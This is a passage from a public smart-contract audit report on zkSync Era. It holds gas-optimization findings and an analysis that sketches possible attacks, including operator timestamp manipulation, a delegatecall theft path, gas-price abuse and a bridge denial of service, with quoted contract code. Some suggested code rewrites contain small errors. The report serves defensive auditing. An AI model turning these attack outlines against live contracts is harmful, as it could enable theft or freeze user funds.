File `ethereum/contracts/zksync/libraries/Merkle.sol`:

```
29:        for (uint256 i; i < pathLength; i = i.uncheckedInc()) {
```

File: `ethereum/contracts/common/AllowList.sol`:

```
62:        for (uint256 i = 0; i < targetsLength; i = i.uncheckedInc()) {
96:        for (uint256 i = 0; i < callersLength; i = i.uncheckedInc()) {
```

However, using library functions, instead of directly increasing `i` in an `unchecked` block is very gas ineffective. To prove that, a simple test in Remix IDE was prepared:

```
    function uncheckedInt() public view {
    uint gas = gasleft();
    for (uint i = 0; i < 100; ) {
        require(i == i);
    unchecked {++i;}
    }

    console.log(gas - gasleft());
}

    function uncheckedIntLib() public view {
    uint gas = gasleft();
    for (uint i = 0; i < 100; i = i.uncheckedInc()) {require(i == i);
    }
    console.log(gas - gasleft());
    }
```

Function `uncheckedInt()` costs 7442 gas, while `uncheckedIntLib()` costs 11742 gas. This implies, that every loop in a form:

```
for (uint256 i = 0; (...) i = i.uncheckedInc()) {
```

Should be rewritten to:

```
for (uint256 i = 0; (...) i = i.uncheckedInc()) {
(...)
unchecked {++i;}
}
```

There are two additional places in `ethereum/contracts/zksync/facets/Executor.sol`, where the similar rule applies

File `ethereum/contracts/zksync/facets/Executor.sol`:

```
123:        for (uint256 i = 0; i < emittedL2Logs.length; i = i.uncheckedAdd(L2_TO_L1_LOG_SERIALIZE_SIZE)) {
331:            currentTotalBatchesVerified = currentTotalBatchesVerified.uncheckedInc();
```

In line 123, `i = i + L2_TO_L1_LOG_SERIALIZE_SIZE` should also be unchecked.
In line 331, it should be: `unchecked {++currentTotalBatchesVerified;}`.

## [G-39] Redundant `if` condition in `Executor.sol`

[File: ethereum/contracts/zksync/facets/Executor.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L354-L367)

```
 if (_proof.serializedProof.length > 0) {
            bool successVerifyProof = s.verifier.verify(
                proofPublicInput,
                _proof.serializedProof,
                _proof.recursiveAggregationInput
            );
            require(successVerifyProof, "p"); // Proof verification fail
        }
        // #else
        bool successVerifyProof = s.verifier.verify(
            proofPublicInput,
            _proof.serializedProof,
            _proof.recursiveAggregationInput
        );
       require(successVerifyProof, "p"); // Proof verification fail
```

In above code section, we're performing zkp verification twice.
For the first time, when `if (_proof.serializedProof.length > 0)`. And then, for the second time, in line 363.

This is redundant. Remove the whole `if (_proof.serializedProof.length > 0)` block, because we're repeating `s.verifier.verify()` call after that block for the second time.

## [G-40] Event in `Executor.sol` can be optimized

[File: ethereum/contracts/zksync/facets/Executor.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L405C49-L405C49-L413)

```
 s.totalBatchesCommitted = _newLastBatch;

        // Reset the batch number of the executed system contracts upgrade transaction if the batch
        // where the system contracts upgrade was committed is among the reverted batches.
        if (s.l2SystemContractsUpgradeBatchNumber > _newLastBatch) {
            delete s.l2SystemContractsUpgradeBatchNumber;
        }

        emit BlocksRevert(s.totalBatchesCommitted, s.totalBatchesVerified, s.totalBatchesExecuted);
```

Since ` s.totalBatchesCommitted = _newLastBatch`, we can change event to:

```
 emit BlocksRevert(_newLastBatch, s.totalBatchesVerified, s.totalBatchesExecuted);
```

## [G-41] Save one negation by rewriting the statement in `DiamonProxy.sol`

[File: ethereum/contracts/zksync/DiamondProxy.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/DiamondProxy.sol#L31)

```
require(!diamondStorage.isFrozen || !facet.isFreezable, "q1");
```

`!A || !B <=> !(A & B)` which means, it can be rewritten to:

```
require(!(diamondStorage.isFrozen && facet.isFreezable)), "q1");
```

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/338#issuecomment-1849048723):**
 > I believe that some penalty may have been applied by me due to repetitive titles. Overall the report is not bad, but I will not change the scoring.

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/338).*

***

# Audit Analysis

For this audit, 6 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-10-zksync-findings/issues/1117) by **zkLotus** received the top score from the judge.

*The following wardens also submitted reports: [pfapostol](https://github.com/code-423n4/2023-10-zksync-findings/issues/743), [catellatech](https://github.com/code-423n4/2023-10-zksync-findings/issues/244), [peanuts](https://github.com/code-423n4/2023-10-zksync-findings/issues/881), [K42](https://github.com/code-423n4/2023-10-zksync-findings/issues/692), and [Sathish9098](https://github.com/code-423n4/2023-10-zksync-findings/issues/599).*

## zkSync Analysis

This analysis report delves into various sections and modules of the zkSync Era codebase that the team audited. Our approach included a thorough examination and testing of the codebase, research on wider security implications, economic risks applicable to the protocol and expanded discussion of risks associated with the use of cross-chain messaging services. 

A number of potential attack vectors were identified related to theoretical weaknesses of game theory and inherent systemic risks associated with specific functionality of the protocol. We supplied feedback on specific sections of protocol architecture and give other recommendations as relevant.

Throughout our analysis, we aimed to provide a comprehensive understanding of the codebase, suggesting areas for possible improvement. To validate our insights, we supplemented our explanations with wider industry research, demonstrating robust comprehension of zkSync Era's internal code functionality and interaction with system contracts.

Our ultimate goal is to provide a report that will give the project team wider perspective and value from our research conducted to strengthen the security posture, usability and efficiency of the protocol.

## Testing the zkSync Era bootloader 

> NOTE: This was performed during the the last week of the Code4rena audit. While the time constraints prevented us from fully completing the endeavor, we plan to follow up post-audit. 

Remediations are included at the start of this document for pragmatic readers, and what follows is an analysis of the tooling available for the bootloader to be tested during an audit. 

To motivate this exploration, testing the bootloader was done with the intent of embodying the persona of a new hire attempting to build a testing suite for a niche aspect of the zkSync system. While the original intention was to build a fully functional test suite, the time allotted was too short to fully implement this vision.

### Remediations

At the end, several suggestions were considered for the Matter Labs team to address:
1. Provide an accessible, easy-to-update test suite, for the bootloader, to exercise both typical and edge-case transactions.
2. Add easy-to-access logging capability for further development, and auditing, of the bootloader.
3. Allow for accessible exploration of the bootloader memory throughout the execution of the bootloader.

**Possible test suite** - For testing the bootloader, many kinds of scenarios can be formulated.  The general structure of the scenarios is the execution of batches.  In the the case that a batch contains a multitude of transactions, there is possibility of the state machine - that is implied by the bootloader's code graph and memory - could provide opportunities for the invariants of the system to be violated.  

It would be valuable to create tests that exercise the bootloader in manners that demonstrate the invariants hold. High-level descriptions of invariants to test against attacks would be:
- Escalate transaction type to privileged upgrade.
- Premature batch closure.
- Skipped transactions.
- Update batch data after closing.
- Incorrect gas calculations.
- Wrong `tx.origin`, `msg.sender` generated.
- `priorityQueue` reordering.
- General overwrite transaction data within batch.
 
**Logging capability** - Put simply, providing easily accessible logging to the system through the test node would make exploration, development, and refactoring of the bootloader code a smoother process.

**Exploring bootloader memory** - Being able to peek into the memory of a running bootloader would be a powerful device. Possible methods could be (with no attempt to rank how difficult it would be to implement):

1. Binary memory dumps - Dump memory to files during execution so that a hex editor can be used to explore the data. Possible options could be to dump before or after each transaction, after a timeout, at every state change, etc.
2. Provide a hook/file/endpoint for an external debugger to connect to: the canonical example is the Chrome web tools, which famously can connect to an external host to debug process on other devices.  Likely there could be challenges in the control of the test node, pausing and resuming operation.
3. Include an internal debugger.

## Analyzing bootloader tooling

### Assessing testing criteria 

A survey of the provided codebase was made for any files related to the operation of the bootloader internals.  No testing suites were found to satisfy that criteria.

While examining the code of the bootloader itself, it was clear that the structure of this subsystem was unsuited to run-of-the-mill testing. This typically involves interacting with explicit interfaces defined in the code, including externally visible functions and constructors.  What was found is that the bootloader operates on memory loaded by the zkSync Era EVM (which we'll call "zkEVM" at times throughout this document). Additionally, there were no externally-visible functions, and no constructor.  

> NOTE: In the scope of the zkSync Era codebase, it is clear that the bootloader was coded in Yul to take advantage of the increased control over the resulting compiled code's performance.  The consequence here is that, for Yul, the limited tooling in the wider EVM-based ecosystem leaves a lot to be desired in terms of developer experience, including the ability to test and benchmark Yul codebases.

At this point, there were two major and relatively obvious paths that could be taken:
1. Existing tools could be used to load and manipulate the bootloader memory and its environment.
2. The bootloader could be modified to provide external interfaces and a constructor to be used in popular testing frameworks.

It was decided that controlling the execution environment would be the best bet. The main factors were:
- Controlling the memory to the granularity required by the bootloader would require brittle and difficult-to-maintain, parallel data structures between the zkEVM and test suite.
- Modifying the code changed the attack surface compared to the original implementation.
- Any modifications would likely change the memory outlay and performance characteristics of the original implementation.

### Criteria for testing the bootloader

During this time, the bootloader code itself was being analyzed for possible attack vectors. As a result, a handful of criteria were surfaced that could help explore these attacks:
1. Many transactions would need to be available to load into memory to explore execution paths in the case memory segregation was compromised.
2. Full control over each transaction was necessary to explore cases where invariants across the zkEVM and bootloader execution were violated. 
3. Logging and exploring the memory space was key.

### Exploring tooling options

Initially the in-scope, zkSync Era EVM code was explored to be used for loading the bootloader and constructing its memory.  The understanding was that the zkEVM already had data structures and interfaces available that would make loading arbitrary transactions into the bootloader's memory simple.  

While the code was available to explore, it was determined that the necessary "plumbing" to quickly get a proof-of-concept would take more time to understand and modify than was available.  After discussing possibilities with the C4 sponsors, it was discovered that there was in fact a "test node" in development (`era_test_node`) that could provide a minimal environment for running the bootloader against individual transactions. This was quickly determined to be useful, and simple entry points and data structures were identified for controlling the bootloader memory:

```rust
// matter-labs/era-test-node, src/node.rs
324:    if !transactions_to_replay.is_empty() {
325:        let _ = node.apply_txs(transactions_to_replay);
326:    }
```

```rust
// matter-labs/era-test-node, src/node.rs
1204: pub fn run_l2_tx_inner(
... 
1245:         let tx: Transaction = l2_tx.clone().into();
1246: 
1247:         vm.push_transaction(tx);
```

```rust
// matter-labs/zksync-era, core/lib/types/src/l2/mod.rs
133: pub struct L2Tx {
```

**Roadblocks: single transaction mode** - During discussions with one of the sponsors, it was made clear that the zkEVM used with the test node was configured to only run the bootloader with a single transaction at a time.  This would be a roadblock.  Scanning the code, it was determined that the solution was to include an existing VM setting:

```rust
// matter-labs/zksync-era, core/lib/multivm/src/interface/types/inputs/execution_mode.rs
8:    vm::VmExecutionMode::Bootloader
```

**Logging woes** - During the implementation of a rough proof-of-concept, it was made clear that there was no easy way to read the logs from the bootloader through the test node. The two suggestions from a sponsor were:

1. Use the `log0` - `log4` events in Yul so logs could be caught by the test node. 
2. Send transactions to the `Console` system contract. 

For the first option, the output would be a series of hex-encoded values according to the event parameters. For the second option, the test node would output the logged strings using when run with the correct command-line setting. This would be the preferred option.  

Unfortunately, neither seemed to be a great option, since the existing `debugLog` calls in the existing bootloader would not work. A third option was to be forking the `zksync-era` crate that was imported into the project and adding `println!` calls for when the `debugLog` hook was triggered.

**Results** - While there wasn't time to fully implement the plan, the intended plan of attack became:

1. Add a command line setting through `clap` to support loading a JSON file with multiple transactions and their fields.
2. Parse the JSON with `serde` and load the data into `L2Tx` instances.
3. Fill `transactions_to_replay` with the data.
4. Switch the vm execution mode to `Bootloader` while this new command line setting is triggered.
5. Fork and update the `zksync-era` crate to output logs in the `debugLog` hook.

## Architectural risks

During the course of the audit certain architectural risks were identified:
- Escalation or a transaction type to privileged a upgrade.
- Premature batch closure.
- Transactions skipped by setting `execute` flag to false by operator in bootloader.
- Force update batch data after closing.
- Incorrect gas calculations.
- DoSing the bootloader.
- Wrong `tx.origin` or `msg.sender` for a transaction.
- Reordering `priorityQueue`.
- Overriding transaction data within batch.
- Unauthorized use of mimic call to impersonate a user.
- `delegatecall` from bootloader address which would grant arbitrary execution in kernel space.
- Verbatim opcodes with elevated privileges or forging L2 logs by bootloader operator.

Apart from those, the team delved into the following possible attack vectors:

### L2 batch timestamp manipulation

Having reliable time of the actions happening on L2 is crucial to the functioning of the whole system. In `SystemContext.setNewBatch()` there is just check if the timestamp is bigger than [previous batch](https://github.com/code-423n4/2023-10-zksync/blob/ef99273a8fdb19f5912ca38ba46d6bd02071363d/code/system-contracts/contracts/SystemContext.sol#L416-L424).
```
    function setNewBatch(
        bytes32 _prevBatchHash,
        uint128 _newTimestamp,
        uint128 _expectedNewNumber,
        uint256 _baseFee
    ) external onlyCallFromBootloader {
        (uint128 previousBatchNumber, uint128 previousBatchTimestamp) = getBatchNumberAndTimestamp();
        require(_newTimestamp > previousBatchTimestamp, "Timestamps should be incremental");
        require(previousBatchNumber + 1 == _expectedNewNumber, "The provided block number is not correct");
```

Later in `ExecutorFacet._verifyBatchTimestamp()` the only safeguard is a check if it is not bigger than `block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA`, which is not set in the config and fallbacks to [365 days](https://github.com/code-423n4/2023-10-zksync/blob/ef99273a8fdb19f5912ca38ba46d6bd02071363d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L94).

### Discussion

1. A malicious operator can easily put this to max value that would be problematic for honest operators, in case that multiple operators will run the L2. This would also break crucial invariant - L2 time is close to the real time measured off-chain.
2. Each priority queue operation has expiration time. The concern here is: will setting batch timestamp long in the future invalidate a message on L1?


## Possible money steal using MsgValueSimulator

There was an issue concerning MsgValueSimulator highlighted in the [previous audit](https://code4rena.com/reports/2023-03-zksync#h-01-the-call-to-msgvaluesimulator-with-non-zero-msgvalue-will-call-to-sender-itself-which-will-bypass-the-onlyself-check). It concerned a situation when `to` address is `MsgValueSimulator` itself.

This was resolved by enforcing that `to` cannot be `MsgValueSimulator`:

```
        require(to != address(this), "MsgValueSimulator calls itself");
```

However, there is an additional case where this check could not protect the smart contract - by using delegatecall, `address(this)` is set to the calling contract while `msg.sender` is preserved. That means that even if we set `to` to `MsgValueSimulator`, `address(this)` will be different and the check will pass. If the call was originating from a system contract, we could recreate the attack found in previous implementation.

Additionally, in `L2EthToken.transferFromTo()` there is check who can call the contract:

```
    function transferFromTo(address _from, address _to, uint256 _amount) external override {
        require(
            msg.sender == MSG_VALUE_SYSTEM_CONTRACT || // @audit can I use MsgValueSimulator to call it using any arbitrary "from" address?
                msg.sender == address(DEPLOYER_SYSTEM_CONTRACT) ||
                msg.sender == BOOTLOADER_FORMAL_ADDRESS,
            "Only system contracts with special access can call this method"
        );
```

### Discussion

If we were able to force one of the contracts to execute this transaction with any `_from`, then we could steal anything from anyone. One specific possible attack vector that might be exploited could be a malicious transaction during which that bootloader can mimiccall or delegatecall to this contract. `ContractDeployer.createAccount()` can probably be utilized somehow in this attack - it is a system contract that can deploy any code and run it. 

### Transaction gas price can be manipulated by user

Gas to pay for executing crosschain transaction from L1 to L2 is calculated using [tx.gasprice](https://github.com/code-423n4/2023-10-zksync/blob/ef99273a8fdb19f5912ca38ba46d6bd02071363d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L304). This is insecure, because this value can be manipulated and even set to 0 using MEV either by the user who posts the transaction or any other actor. In such case the gas to pay will fall back to [`FAIR_L2_GAS_PRICE`](https://github.com/code-423n4/2023-10-zksync/blob/ef99273a8fdb19f5912ca38ba46d6bd02071363d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L183):

```
    function _deriveL2GasPrice(uint256 _l1GasPrice, uint256 _gasPricePerPubdata) internal pure returns (uint256) {
        uint256 pubdataPriceETH = L1_GAS_PER_PUBDATA_BYTE * _l1GasPrice;
        uint256 minL2GasPriceETH = (pubdataPriceETH + _gasPricePerPubdata - 1) / _gasPricePerPubdata;

        return Math.max(FAIR_L2_GAS_PRICE, minL2GasPriceETH);
    }
```

In the case of gas spikes or turbulent market conditions, this could end up having grave consequences.

There is also an additional attack vector: in the case that there is not enough gas to cover transaction cost, it is not reverted, but refund is [set to 0](https://github.com/code-423n4/2023-10-zksync/blob/ef99273a8fdb19f5912ca38ba46d6bd02071363d/code/system-contracts/bootloader/bootloader.yul#L983-L996):

```
                checkEnoughGas(gasForExecution)

                let gasBeforeExecution := gas()
                success := ZKSYNC_NEAR_CALL_executeL1Tx(
                    callAbi,
                    txDataOffset
                )
                notifyExecutionResult(success)
                let gasSpentOnExecution := sub(gasBeforeExecution, gas())

                potentialRefund := sub(gasForExecution, gasSpentOnExecution)

                if gt(gasSpentOnExecution, gasForExecution) {
                    potentialRefund := 0
                }
```

This means that operator may execute the transaction without getting full payment for doing it.

### Discussion

1. Gasprice on L2 is taken from the [transaction](https://github.com/code-423n4/2023-10-zksync/blob/ef99273a8fdb19f5912ca38ba46d6bd02071363d/code/system-contracts/bootloader/bootloader.yul#L870-L873). Equivalent of gas used is actually [minted on L2](https://github.com/code-423n4/2023-10-zksync/blob/ef99273a8fdb19f5912ca38ba46d6bd02071363d/code/system-contracts/bootloader/bootloader.yul#L927-L935). A concern is the worst case scenario for two parties:
    - Operator - not getting paid for the transaction.
    - User - not getting due refund.

2. Gas handling on L2 is peculiar. In case that there is not enough gas to cover the protocol will [accept the loss](https://github.com/code-423n4/2023-10-zksync/blob/ef99273a8fdb19f5912ca38ba46d6bd02071363d/code/system-contracts/bootloader/bootloader.yul#L908-L927).

The overarching idea is exploiting possible ways to monetize on free gas execution, for example:

- Using gas tokens to sell them on market.
- Execute other users transactions without a need to pay for a gas.
- Gaining more refund than eligible for the user on L1.

### `NonceHolder.isNonceUsed()` doesn't work with Arbitrary nonce

There are 2 possible ways of how nonces are assigned. Either they are incremented sequentially, or arbitrarily. There is however inconsistency on how it's set and handled. E.g. in function [`setValueUnderNonce()`](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/system-contracts/contracts/NonceHolder.sol#L147-L150), there are safeguards only for sequential nonce. An arbitrary nonce can by set to any value, even smaller than a current one. So technically, nonce can be, for example: 1, 5, 3. However, `isNonceUsed()` will return true for numbers 2 and 4 even though those weren't used:

```
    function isNonceUsed(address _address, uint256 _nonce) public view returns (bool) { // @audit how can I set nonce as not used?
        uint256 addressAsKey = uint256(uint160(_address));
        return (_nonce < getMinNonce(_address) || nonceValues[addressAsKey][_nonce] > 0); // @audit `_nonce < getMinNonce(_address) ` doesn't work with arbitrary nonces
    }
```

### Discussion

We identified two possible solutions to the issue:

1. A nonce value lower than current one should be prohibited.
2. The check in `isNonceUsed()` should be changed to `nonceValues[addressAsKey][_nonce] > 0`.

### Possible L1 bridge DoS through processing a batch that will OOG on L1

Bootloader sends logs for a batch to L1 using the [`L1Messenger.publishPubdataAndClearState()`](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/system-contracts/contracts/L1Messenger.sol#L206) function. It checks if the amount of logs is not too big in this require statement:

`require(numberOfL2ToL1Logs <= numberOfL2ToL1Logs, "Too many L2->L1 logs")`

It is however always true, because it checks `numberOfL2ToL1Logs` against itself:

```
    function publishPubdataAndClearState( // @audit bootloader does not use this function anywhere
        bytes calldata _totalL2ToL1PubdataAndStateDiffs
    ) external onlyCallFromBootloader {
        uint256 calldataPtr = 0;

        /// Check logs
        uint32 numberOfL2ToL1Logs = uint32(bytes4(_totalL2ToL1PubdataAndStateDiffs[calldataPtr:calldataPtr + 4]));
        require(numberOfL2ToL1Logs <= numberOfL2ToL1Logs, "Too many L2->L1 logs"); // @issue it's tautology. Will always be true. Can operator then publish some huge amount of logs that will not be executed on L1?
...
```

That means that an operator is technically able to pass here huge amount of pubdata that will not be possible to process on L1 due to block gas limit constraints. That would mean that the transactions would not be able to be confirmed.

### Discussion

There is a limitation to that - bootloader memory is constrained, probably enforcing the max pubdata that can be sent. If an operator is able to somehow skip this check, the attack could be effective. The consequences are very severe - without possibility to settle transaction on L1, no more transactions can be sent to L2 from L1, permanently freezing the bridge.


For reference usage in bootloader - this function is used in bootloader disguised behind a msg.selector:

https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/system-contracts/bootloader/bootloader.yul#L2474

## Governance

This section of the analysis report encompasses the governance section of the codebase. 

The team adopted a comprehensive and methodical approach to examine zkSync Era's governance contract in order to meet safe security standards - and ensure that no stone has been left unturned.  Upon first impression, it was deemed that the overall code structure of the `Governance.sol` contract is streamlined and does not contain any unnecessary or overly-complex code. Additionally, the comprehensive comments made it highly readable and understandable. The simplicity of the code is a huge benefit in terms of security, given the fact that it is simple and not purposefully bloated. Secondly, it meets expectations in respect of governance functionality and allows the team to fulfill all of their needs without any problems. 

With that being said, vulnerabilities in smart contracts are present due to a wide variety of reasons, with some being either irregular logic, or the code being too weak due to the fact that the developers were not able to take into consideration security aspects due to the complexity of the code. However, it seems like zkSync Era did not suffer from this dilemma within its governance contract, and reached their goal successfully.

The zkSync Era team also ensured that the governance aspect of the codebase is cross-chain compatible, allowing it to be future proof. The main governance contract is deployed on a layer 1 solution (Ethereum). This contracts embeds multiple functions which allow the contract itself, the owner of the contract and the "security council" (a multi-sig address) to make decisions in important situations as well as create and/or cancel operations and check the status of various operations based on the ID of the operation that is being queried. 

The following objectives were taken into consideration prior to the security analysis of the Governance contract:
- Ensuring the functionality of the `Governance.sol` contract is precise and correct.
- The governance measures are fully reasonable and are not excessive in respect of the mission to implement full decentralization in the future.
- The contract is flawless to the extent where no vulnerabilities are present.

### Variables

The main variables which are consistent throughout the codebase are the following:

1. `EXECUTED_PROPOSAL_TIMESTAMP` which is a constant that is used for the purpose of checking the timestamp of completed operations.
2. `securityCouncil` which is a multi-sig address that is responsible for governance related operations.
3. `timestamps` which is a mapping that allows for dictating when an operation is ready for execution, or is simply utilized for bookkeeping purposes.
4.  `minDelay` which is a `uint256` stored variable holding the number of seconds for operations to be ready for execution.

### Modifiers

The `Governance.sol` contract utilizes 3 key modifiers which consist of:

1. `onlySelf` which is responsible for checking that `msg.sender == address(this)`.
2. `onlySecurityCouncil` which is responsible for checking that `msg.sender == securityCouncil`.
3. `onlyOwnerOrSecurityCouncil` which is responsible for checking that `msg.sender == owner() || msg.sender == securityCouncil`.

### Constructor

The `constructor` takes in the `_admin` variable which dictates who is the admin of the contract. The 2nd variable within the constructor is the `_securityCouncil` multi-sig address. Lastly, there is a 3rd parameter which is the `_minDelay`.

```solidity
constructor(address _admin, address _securityCouncil, uint256 _minDelay) {
    require(_admin != address(0), "Admin should be non zero address");

    _transferOwnership(_admin);

    securityCouncil = _securityCouncil;
    emit ChangeSecurityCouncil(address(0), _securityCouncil);

    minDelay = _minDelay;
    emit ChangeMinDelay(0, _minDelay);
}
```

The constructor enables a `0` address check to ensure that the admin cannot be set as the `0` address, and after that check is valid, it transfers the ownership to the address which has been passed through into the `_admin` variable. Surprisingly, it is interesting that there is no `0` address check for the `_securityCouncil` variable given the fact that they are just as important as the `admin` when it comes to the execution of certain functions. Nevertheless, the multi-sig address which was passed into `_securityCouncil` is assigned to `securityCouncil` allowing it to be used later down the line under the `securityCouncil` variable. The changes for the security council are emitted via the `ChangeSecurityCouncil` function, which means that the security council is changed from `address(0)` to `_securityCouncil`. The same logic applies to `_minDelay`.

### Functions pertaining to operation states

One of the first functions that we see within the contract is the `isOperation` function. This function works by taking a `bytes32` input under `_id` and returning a bool operation under the condition that the `_id` corresponds to a registered operation. This function works as expected, as entering an ID that does not exist returns a false via the boolean operation.

```solidity
function isOperation(bytes32 _id) public view returns (bool) {
    return getOperationState(_id) != OperationState.Unset;
}
```

The second function is the `isOperationPending` function which takes in the same input under the same conditions with the same result; however, it is stated via comments that a "pending" operation may also be "ready". This seemed rather interesting upon first glance given the fact that there is a separate state for operations which is "ready". Therefore, there is a distinction between a "pending" state and a "ready" state. However, following the code logic here, it is as if the states are merged and receive the same output, which could be confusing. It is unknown as to why the ready state is being accounted for when the state is essentially separate, and also has its own function.

```solidity
function isOperationPending(bytes32 _id) public view returns (bool) {
    OperationState state = getOperationState(_id);
    return state == OperationState.Waiting || state == OperationState.Ready;
}

function isOperationReady(bytes32 _id) public view returns (bool) {
    return getOperationState(_id) == OperationState.Ready;
}
```

A comment prior to the `isOperationReady` function also states that a "ready" operation is also "pending". Again, the logic here in regards to the states is quite interesting when it comes to understanding these pieces of code, however, there are no problems discovered post-analysis.

The caller also has the ability to check whether an operation has completed or not:

```solidity
function isOperationDone(bytes32 _id) public view returns (bool) {
    return getOperationState(_id) == OperationState.Done;
}
```

And lastly, there is the main function which does what all these previous 3 functions do all in one:

```solidity
    function getOperationState(bytes32 _id) public view returns (OperationState) {
        uint256 timestamp = timestamps[_id];
        if (timestamp == 0) {
            return OperationState.Unset;
        } else if (timestamp == EXECUTED_PROPOSAL_TIMESTAMP) {
            return OperationState.Done;
        } else if (timestamp > block.timestamp) {
            return OperationState.Waiting;
        } else {
            return OperationState.Ready;
        }
    }
```

It seems to be that the zkSync Era team decided to add more precise functionality within the code for the sake of higher user satisfaction, which is completely understandable. It can be argued, however, that because the `getOperationState` function exists, it explicitly undermines the functionality of the other functions and ultimately renders them ineffectual.

### Main Functions

The `scheduleTransparent` function takes in an `_operation` input via `Operation calldata _operation`, along with a `_delay` in `uint256` format. Essentially, only the owner can call this function (as the function has an `onlyOwner` modifier) meaning the owner has the most control in this scenario. The owner can call it simply with the delay timelock on its own, or with the security council. However, the security council cannot do this without the owner; it is simply not possible. The purpose of this function is to enable a completely transparent upgrade whilst also providing the upgrade data on-chain. 

1. The `_operation` which is passed into the function is embedded into `hashOperation`, where the result is assigned to a `bytes32` `id`.
2. This `id` is then scheduled via `_schedule` along with the `_delay` that was passed into the function prior to execution.
3. The operation is emitted via `TransparentOperationScheduled`.

```solidity
function scheduleTransparent(Operation calldata _operation, uint256 _delay) external onlyOwner {
    bytes32 id = hashOperation(_operation);
    _schedule(id, _delay);
    emit TransparentOperationScheduled(id, _delay, _operation);
}
```

The `scheduleShadow` function is almost the same as the `scheduleTransparent` function, however, the shadow function allows you to enable an upgrade without publishing the upgrade data on-chain. The reason as to why this function exists is unknown, however, it does raise questions as to why zkSync would not like to publish the data on-chain in some events.

1. The function executes `_schedule` with `_id` and `_delay`.
2. The function emits `ShadowOperationScheduled(_id, _delay)`.

```solidity
function scheduleShadow(bytes32 _id, uint256 _delay) external onlyOwner {
    _schedule(_id, _delay);
    emit ShadowOperationScheduled(_id, _delay);
    }
```

The `cancel` function takes in `_id` via bytes32 format, permitting this function to be executed by the owner OR the security council. This function is responsible for simply canceling operations.

1. The `_id` is checked via the `isOperationPending` function, and if it is not pending, then it is rejected. In order to cancel an operation, it has to be pending.
2. It deletes the `_id` from `timestamps` array.
3. The function emits `OperationCancelled(_id)`.

```solidity
function cancel(bytes32 _id) external onlyOwnerOrSecurityCouncil {
    require(isOperationPending(_id), "Operation must be pending");
    delete timestamps[_id];
    emit OperationCancelled(_id);
}
```

The `execute` function is responsible for executing scheduled operations after the delay phase has been passed. This function enables the `onlyOwnerOrSecurityCouncil` modifier, also permitting this function to be executed by the owner OR the security council. The function takes in the exact same input (`_operation`) as in the `scheduleTransparent` function.

1. The `_operation` which is passed into the function is embedded into `hashOperation` via `hashOperation(_operation)`, where it is then assigned to a `bytes32` `id`.
2. It will check whether the predecessor operation has been completed by calling `_checkPredecessorDone`, accounting for `_operation.predecessor` within that call.
3. A require check is done in order to ensure that the operation under the ID is ready to be executed.
4. The operation is executed via an `_execute` call, where the `_operation.calls` is passed in.
5. Surprisingly, and thankfully, this function performs a require check in order to prevent re-entrancy attacks so that certain operations cannot be replayed.
6. The operation state is changed to done, by embedding the `id` into `timestamps` array, and emitting the change via `OperationExecuted` along with the `id` passed in.

```solidity
function execute(Operation calldata _operation) external onlyOwnerOrSecurityCouncil {
    bytes32 id = hashOperation(_operation);
    _checkPredecessorDone(_operation.predecessor);
    require(isOperationReady(id), "Operation must be ready before execution");
    _execute(_operation.calls);
    require(isOperationReady(id), "Operation must be ready after execution");
    timestamps[id] = EXECUTED_PROPOSAL_TIMESTAMP;
    emit OperationExecuted(id);
}
```

The `executeInstant` function is almost identical to the `execute` function, with the only difference being that the require check of the operation is changed from:
`require(isOperationReady(id)` to `require(isOperationPending(id)`.

The `hashOperation()` function is responsible for taking in the `_operation` (with the same premise as prior functions) and returning a keccak256 of the `_operation`. This can be executed by anybody.

```solidity
function hashOperation(Operation calldata _operation) public pure returns (bytes32) {
    return keccak256(abi.encode(_operation));
}
```

The `schedule` function is responsible for scheduling operations which should become valid after a specific delay has passed. The function takes in `_id` in `bytes32` format, along with `_delay` in `uint256` format. This function is available to internal calls only.

1. The function checks whether the `_id` that is passed in is NOT an operation, otherwise it recognizes that it already exists, therefore, the check fails.
2. The function also checks whether the `_delay` is more than or equal to `minDelay`, otherwise it fails the check under the condition that the proposed delay is lower than the minimum delay.
3. The `_id` is updated within the timestamps through `timestamps[_id] = block.timestamp + _delay`.

```solidity
function _schedule(bytes32 _id, uint256 _delay) internal {
    require(!isOperation(_id), "Operation with this proposal id already exists");
    require(_delay >= minDelay, "Proposed delay is less than minimum delay");

    timestamps[_id] = block.timestamp + _delay;
}
```

The `_execute` function is utilized for the execution of operation calls. Not just a singular one, but multiple, which did raise concerns of potential running out of gas issues, however, the calculation for gas allowance seems to be `2^32 - 1` gas available for execution; therefore, running out of gas does not seem plausible in this scenario. The function takes in `Call[] calldata _calls` as input, and the function can only be executed internally.

1. The function implements a classical loop in the format of:
    - `for (uint256 i = 0; i < _calls.length; ++i)`
2. If the function is ruled as a success, it will `returnData` via bytes memory, which means that the `returnData` is bound to that specific contract. This did raise questions whether there would be any attack vectors regarding the usage of memory data when thinking of diamond implementations, however, the functionality is perfectly normal and as intended following EIP-2535. To slightly unpack further, this success (via bool) is dependant on the actual `call` execution succeeding via:
    - `_calls[i].target.call{value: _calls[i].value}(_calls[i].data);`
3. If the call is not successful, then the `_execute` function does an assembly operation where it outputs an error via:
    - `revert(add(returnData, 0x20), mload(returnData))`.

```
function _execute(Call[] calldata _calls) internal {
    for (uint256 i = 0; i < _calls.length; ++i) {
        (bool success, bytes memory returnData) = _calls[i].target.call{value: _calls[i].value}(_calls[i].data);
